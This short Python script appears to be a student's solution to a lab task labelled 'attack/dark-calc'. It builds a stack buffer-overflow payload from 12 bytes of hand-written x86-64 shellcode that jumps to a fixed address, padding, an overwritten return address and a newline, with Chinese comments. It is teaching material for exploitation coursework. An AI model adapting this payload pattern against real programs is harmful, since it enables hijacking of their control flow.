#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\xbf\x04\x00\x00\x00\xb8\x87\x1a\x40\x00\xff\xe0" # 12字节自己设计shellcode
payload += b"A" * 12 # 填充到12字节
payload += b"\xd0\x0f\x80\x00\x10\x72\x00\x00" # 返回地址0x721000800fd0
payload += b"\x0a"

sys.stdout.buffer.write(payload)
